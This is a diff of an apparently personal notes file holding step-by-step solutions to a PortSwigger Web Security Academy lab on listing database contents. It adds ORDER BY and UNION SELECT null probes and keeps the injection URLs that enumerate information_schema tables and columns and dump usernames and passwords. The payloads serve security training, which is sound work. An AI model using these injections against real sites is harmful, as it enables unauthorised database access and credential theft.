@@ -14,6 +14,9 @@ solution: https://acc51f671f380132802638e500580053.web-security-academy.net/filt
 help: https://www.youtube.com/watch?v=nq3KTL3Cnog
 url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
 solution: 
-  step-1: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select table_name,null from information_schema.tables--
-  step-2: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select column_name,null from information_schema.columns where table_name='users_jxwhjs'--
-  step-3: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select username_kivqza,password_vsfmuo from users_jxwhjs--
+  step-1: https://ac1a1fa91e4619b8807040ee00fb0030.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' order by 2--
+  step-2: https://ac1a1fa91e4619b8807040ee00fb0030.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories' union select null,null--
+  step-3: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select table_name,null from information_schema.tables--
+  step-4: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select column_name,null from information_schema.columns where table_name='users_jxwhjs'--
+  step-5: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select username_kivqza,password_vsfmuo from users_jxwhjs--
+
